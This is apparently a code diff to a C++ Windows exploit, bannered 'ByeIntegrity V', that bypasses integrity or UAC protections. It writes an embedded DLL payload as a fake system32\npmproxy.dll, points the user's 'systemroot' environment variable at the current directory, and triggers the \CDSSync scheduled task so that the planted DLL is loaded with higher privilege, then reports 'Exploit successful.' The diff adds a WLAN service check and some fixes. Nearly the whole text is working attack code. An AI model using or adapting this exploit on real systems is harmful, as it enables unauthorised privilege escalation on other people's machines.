@@ -4,7 +4,7 @@
 #include <iostream>
 #include <string>
 
-#include "resource.h"
+#include "resource.hpp"
 
 EXTERN_C IMAGE_DOS_HEADER __ImageBase;
 
@@ -12,7 +12,48 @@ int main()
 {
 	auto* hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
 
-	auto* hResInfo = FindResourceW(reinterpret_cast<HMODULE>(&__ImageBase), MAKEINTRESOURCEW(IDR_DLLPAYLOAD), L"PAYLOAD");
+	SetConsoleTextAttribute(hConsole, 8);
+	std::wcout <<
+		L" __________              .___        __                      .__  __           ____   ____\n"
+		L" \\______   \\___.__. ____ |   | _____/  |_  ____   ___________|__|/  |_ ___.__. \\   \\ /   /\n"
+		L"  |    |  _<   |  |/ __ \\|   |/    \\   __\\/ __ \\ / ___\\_  __ \\  \\   __<   |  |  \\   Y   / \n"
+		L"  |    |   \\\\___  \\  ___/|   |   |  \\  | \\  ___// /_/  >  | \\/  ||  |  \\___  |   \\     /  \n"
+		L"  |______  // ____|\\___  >___|___|  /__|  \\___  >___  /|__|  |__||__|  / ____|    \\___/   \n"
+		L"         \\/ \\/         \\/         \\/          \\/_____/                 \\/                 \n\n";
+	SetConsoleTextAttribute(hConsole, 7);
+
+	auto* scHandle = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
+	if (!scHandle)
+	{
+		std::wcout << L"OpenSCManagerW() failed. Error: " << GetLastError() << std::endl;
+		return EXIT_FAILURE;
+	}
+
+	auto* hService = OpenServiceW(scHandle, L"WlanSvc", SERVICE_QUERY_STATUS);
+	CloseServiceHandle(scHandle);
+	if (!hService)
+	{
+		std::wcout << L"OpenServiceW() failed. Error: " << GetLastError() << std::endl;
+		return EXIT_FAILURE;
+	}
+
+	SERVICE_STATUS serviceStatus;
+	if (!QueryServiceStatus(hService, &serviceStatus))
+	{
+		CloseServiceHandle(hService);
+		std::wcout << L"QueryServiceStatus() failed. Error: " << GetLastError() << std::endl;
+		return EXIT_FAILURE;
+	}
+
+	CloseServiceHandle(hService);
+	if (serviceStatus.dwCurrentState == SERVICE_STOPPED)
+	{
+		std::wcout << L"The WLAN AutoConfig service needs to be running.\n";
+		return 0;
+	}
+
+	auto* hResInfo = FindResourceW(reinterpret_cast<HMODULE>(&__ImageBase), MAKEINTRESOURCEW(IDR_DLLPAYLOAD),
+	                               L"PAYLOAD");
 	if (!hResInfo)
 	{
 		std::wcout << L"FindResourceW() failed. Error: " << GetLastError() << std::endl;
@@ -37,7 +78,7 @@ int main()
 		return EXIT_FAILURE;
 	}
 	auto* hFile = CreateFileW(L"system32\\npmproxy.dll", FILE_WRITE_ACCESS, 0, nullptr, CREATE_NEW,
-		FILE_ATTRIBUTE_NORMAL, nullptr);
+	                          FILE_ATTRIBUTE_NORMAL, nullptr);
 	if (hFile == INVALID_HANDLE_VALUE)
 	{
 		RemoveDirectoryW(L"system32");
@@ -46,7 +87,7 @@ int main()
 	}
 	DWORD writtenBytes;
 	const auto result = WriteFile(hFile, pResource, SizeofResource(reinterpret_cast<HMODULE>(&__ImageBase), hResInfo),
-		&writtenBytes, nullptr);
+	                              &writtenBytes, nullptr);
 	CloseHandle(hFile);
 	if (!result)
 	{
@@ -67,7 +108,7 @@ int main()
 
 	ITaskService* taskService;
 	hr = CoCreateInstance(CLSID_TaskScheduler, nullptr, CLSCTX_INPROC_SERVER, IID_ITaskService,
-		reinterpret_cast<LPVOID*>(&taskService));
+	                      reinterpret_cast<LPVOID*>(&taskService));
 	if (FAILED(hr))
 	{
 		CoUninitialize();
@@ -77,7 +118,7 @@ int main()
 		return EXIT_FAILURE;
 	}
 
-	const VARIANT variant{ {{VT_NULL, 0}} };
+	const VARIANT variant{{{VT_NULL, 0}}};
 	hr = taskService->Connect(variant, variant, variant, variant);
 	if (FAILED(hr))
 	{
@@ -155,6 +196,7 @@ int main()
 		DeleteFileW(L"system32\\npmproxy.dll");
 		RemoveDirectoryW(L"system32");
 		std::wcout << L"ITaskService::GetFolder() (1) failed. HRESULT: 0x" << std::hex << hr << std::endl;
+		return EXIT_FAILURE;
 	}
 
 	auto* diagTaskPath = SysAllocString(L"\\CDSSync");
@@ -168,6 +210,7 @@ int main()
 		DeleteFileW(L"system32\\npmproxy.dll");
 		RemoveDirectoryW(L"system32");
 		std::wcout << L"ITaskFolder::GetTask() (1) failed. HRESULT: 0x" << std::hex << hr << std::endl;
+		return EXIT_FAILURE;
 	}
 
 	const auto requiredSize = static_cast<ULONG_PTR>(GetCurrentDirectoryW(0, nullptr));
@@ -175,7 +218,7 @@ int main()
 	GetCurrentDirectoryW(static_cast<DWORD>(requiredSize), currentDirectory);
 
 	const auto status = RegSetKeyValueW(HKEY_CURRENT_USER, L"Environment", L"systemroot", REG_SZ, currentDirectory,
-		requiredSize * sizeof(WCHAR) + sizeof(L'\0'));
+	                                    requiredSize * sizeof(WCHAR) + sizeof(L'\0'));
 	delete[] currentDirectory;
 	if (status)
 	{
@@ -209,20 +252,20 @@ int main()
 	RegDeleteKeyValueW(HKEY_CURRENT_USER, L"Environment", L"systemroot");
 	DeleteFileW(L"system32\\npmproxy.dll");
 	RemoveDirectoryW(L"system32");
-	
+
 	if (taskResult != ERROR_SUCCESS)
 	{
-		std::wcout << L"The task process failed. Process exit code: " << taskResult << std::endl;
+		std::wcout << L"The task process failed. Exit code (HRESULT): 0x" << std::hex << taskResult << std::endl;
 		return EXIT_FAILURE;
 	}
-	
-	SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
+
+	SetConsoleTextAttribute(hConsole, 2);
 	std::wcout << L">>> ";
-	SetConsoleTextAttribute(hConsole, FOREGROUND_INTENSITY);
+	SetConsoleTextAttribute(hConsole, 12);
 	std::wcout << L"[!] ";
-	SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
+	SetConsoleTextAttribute(hConsole, 2);
 	std::wcout << L"Exploit successful.\n\n";
 	SetConsoleTextAttribute(hConsole, 7);
-	
+
 	return 0;
 }
